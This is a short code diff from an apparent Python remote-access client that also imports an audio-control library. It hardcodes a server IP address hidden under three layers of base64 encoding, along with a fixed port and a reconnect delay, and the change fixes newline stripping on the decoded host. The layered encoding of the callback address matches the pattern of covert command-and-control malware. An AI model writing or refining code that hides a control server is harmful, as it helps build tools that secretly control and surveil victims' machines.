@@ -13,7 +13,7 @@ from pycaw.pycaw import AudioUtilities
 encoded_ip = "VFZScmQweHFSVEZOZVRSNFRrUmpkVTFVVVVzPQ=="
 encoded_ip = base64.b64decode(encoded_ip).decode("utf-8")
 encoded_ip = base64.b64decode(encoded_ip).decode("utf-8")
-HOST = base64.b64decode(encoded_ip).decode("utf-8")
+HOST = base64.b64decode(encoded_ip).decode("utf-8").replace("\n", "")
 PORT = 7833
 RECONNECT_DELAY = 3
 
